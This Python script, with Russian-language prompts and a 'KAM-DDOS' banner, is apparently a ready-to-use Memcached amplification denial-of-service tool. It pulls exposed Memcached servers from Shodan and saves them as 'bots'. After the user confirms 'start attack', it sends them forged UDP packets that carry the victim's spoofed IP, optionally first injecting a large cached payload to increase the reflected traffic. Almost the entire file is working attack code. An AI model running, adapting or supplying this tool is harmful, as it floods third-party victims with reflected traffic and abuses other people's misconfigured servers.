#-- coding: utf8 --
#!/usr/bin/env python3
import sys, os, time, shodan
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout

starttime = time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield

class color:
    HEADER = '\033[0m'

keys = Path("./api.txt")
logo = '''\033[33m


 __    __   ______   __       __          _______   _______    ______    ______  
/  |  /  | /      \ /  \     /  |        /       \ /       \  /      \  /      \ 
$$ | /$$/ /$$$$$$  |$$  \   /$$ |        $$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |
$$ |/$$/  $$ |__$$ |$$$  \ /$$$ | ______ $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ \__$$/ 
$$  $$<   $$    $$ |$$$$  /$$$$ |/      |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$      \ 
$$$$$  \  $$$$$$$$ |$$ $$ $$/$$ |$$$$$$/ $$ |  $$ |$$ |  $$ |$$ |  $$ | $$$$$$  |
$$ |$$  \ $$ |  $$ |$$ |$$$/ $$ |        $$ |__$$ |$$ |__$$ |$$ \__$$ |/  \__$$ |
$$ | $$  |$$ |  $$ |$$ | $/  $$ |        $$    $$/ $$    $$/ $$    $$/ $$    $$/ 
$$/   $$/ $$/   $$/ $$/      $$/         $$$$$$$/  $$$$$$$/   $$$$$$/   $$$$$$/  
                                                                                 
                                                                                 
            \033[0mTermux-Utility            vk: @terutil  \033[0m                                                                              

                                 
'''
print(logo)

if keys.is_file():
    with open('api.txt', 'r') as file:
        SHODAN_API_KEY=file.readline().rstrip('\n')
else:
    file = open('api.txt', 'w')
    SHODAN_API_KEY = input('\033[34m[▸] Введите API-key Shodan \033[0m: ')
    file.write(SHODAN_API_KEY)
    print('\033[32m[!]Ваш API-key записан в файл api.txt \033[0m')
    file.close()

while True:
    api = shodan.Shodan(SHODAN_API_KEY)
    print('')
    try:
        myresults = Path("./bots.txt")
        query = input("\033[33m[#] Использовать встроенных ботов Shodan? <Y/n> \033[0m: ").lower()
        if query.startswith('y'):
            print('')
            print('\033[36m [~] Checking Shodan.io API Key \033[0m: %s' % SHODAN_API_KEY)
            results = api.search('product:"Memcached" port:11211')
            print('\033[32m [✓] API Key Authentication\033[0m: SUCCESS')
            print('\033[36m [~] Number of bots \033[0m: %s' % results['total'])
            print('')
            saveresult = input("\033[33m[#] Сохранить результаты для дальнейшего использования? <Y/n> \033[0m: ").lower()
            if saveresult.startswith('y'):
                file2 = open('bots.txt', 'a')
                for result in results['matches']:
                    file2.write(result['ip_str'] + "\n")
                print('\033[32m[!] Записан файл bots.txt \033[0m')
                print('')
                file2.close()
        saveme = input('\033[33m[#] Использовать локалные данные Shodan? (Желательно - "Y") <Y/n>: ').lower()
        if myresults.is_file():
            if saveme.startswith('y'):
                with open('bots.txt') as my_file:
                    ip_array = [line.rstrip() for line in my_file]
        else:
            print('')
            print('\033[31m[✘] Error: не найден файл bots.txt')
            print('')
        if saveme.startswith('y') or query.startswith('y'):
            print('')
            target = input("\033[34m[▸] Введите IP сайта: ")
            targetport = input("\033[34m[▸] Введите порт (Default 80): ") or "80"
            power = int(input("\033[34m[▸] Введите мощность: (Default 1) \033[0m: ") or "1")
            print('')
            data = input("\033[34m[+] Введите нагрузку, содержащую пакеты: \033[0m") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
            if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
                dataset = "set injected 0 3600 ", len(data)+1, "\r\n", data, "\r\n get injected\r\n"
                setdata = ("\x00\x00\x00\x00\x00\x00\x00\x00set\x00injected\x000\x003600\x00%s\r\n%s\r\n" % (len(data)+1, data))
                getdata = ("\x00\x00\x00\x00\x00\x00\x00\x00get\x00injected\r\n")
                print("\033[33m[~] Преобразование нагрузки")
                time.sleep(2)
                print("\033[32m[✓] Нагрузка преобразована. \033[0m", dataset)
            print('')
            if query.startswith('y'):
                iplist = input('\033[33m[#] Отобразить ботов из Shodan? <Y/n> \033[0m: ').lower()
                if iplist.startswith('y'):
                    print('')
                    counter= int(0)
                    for result in results['matches']:
                        host = api.host('%s' % result['ip_str'])
                        counter=counter+1
                        print('\033[32m[+] Shodan Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, result['ip_str'], host.get('os', 'n/a'), host.get('org', 'n/a')))
                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
            if saveme.startswith('y'):
                iplistlocal = input('\033[33m[#] Отобразить все локальные биты? <Y/n> \033[0m: ').lower()
                if iplistlocal.startswith('y'):
                    print('')
                    counter= int(0)
                    for x in ip_array:
                        host = api.host('%s' % x)
                        counter=counter+1
                        print('\033[32m[+] Shodan Server (%d) | IP: %s | OS: %s | ISP: %s | \033[0m' % (counter, x, host.get('os', 'n/a'), host.get('org', 'n/a')))
                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
            print('')
            engage = input('\033[31m[!] Начать атаку? %s? <Y/n> \033[0m: ' % target).lower()
            if engage.startswith('y'):
                if saveme.startswith('y'):
                    for i in ip_array:
                        if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
                            print('\033[32m[+] Отправка 2-ух поддельных пакетов \033[0m: %s' % (i))
                            with suppress_stdout():
                                send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=setdata), count=1)
                                send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=getdata), count=power)
                        else:
                            if power>1:
                                print('\033[32m[+] Отправка %d поддельных UDP пакетов в \033[0m: %s' % (power, i))
                                with suppress_stdout():
                                    send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                            elif power==1:
                                print('\033[32m[+] Отправка пакета UDP в \033[0m: %s' % i)
                                with suppress_stdout():
                                    send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                else:
                    for result in results['matches']:
                        if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
                            print('\033[32m[+] Sending 2 forged synchronized payloads to \033[0m: %s' % (i))
                            with suppress_stdout():
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=setdata), count=1)
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=getdata), count=power)
                        else:
                            if power>1:
                                print('\033[32m[+] Sending %d forged UDP packets to \033[0m: %s' % (power, result['ip_str']))
                                with suppress_stdout():
                                    send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                            elif power==1:
                                print('\033[32m[+] Sending 1 forged UDP packet to \033[0m: %s' % result['ip_str'])
                                with suppress_stdout():
                                    send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                print('')
                print('\033[36m[•] Задание выполнено. \033[0m')
                break
            else:
                print('')
                print('\033[31m[✘] Error: %s not engaged! \033[0m' % target)
                print('\033[31m[~] Restarting Platform! Please wait. \033[0m')
                print('')
        else:
            print('')
            print('\033[31m[✘] Error: Не найдено ботов Shodan \033[0m')
            print('\033[31m[~] Restarting Platform! Please wait. \033[0m')
            print('')

    except shodan.APIError as e:
            print('\033[31m[✘] Error \033[0m: %s' % e)
            option = input('\033[33m[#] Вы хотите изменить API-key? <Y/n> \033[0m: ').lower()
            if option.startswith('y'):
                file = open('api.txt', 'w')
                SHODAN_API_KEY = input('\033[34m[▸] Введите API-key Shodan: ')
                file.write(SHODAN_API_KEY)
                print('\033[32m[~] File written: ./api.txt')
                file.close()
                print('\033[31m[~] Restarting Platform! Please wait.')
                print('')
            else:
                print('')
                print('\033[31m[•] Завершение программы.')
                break
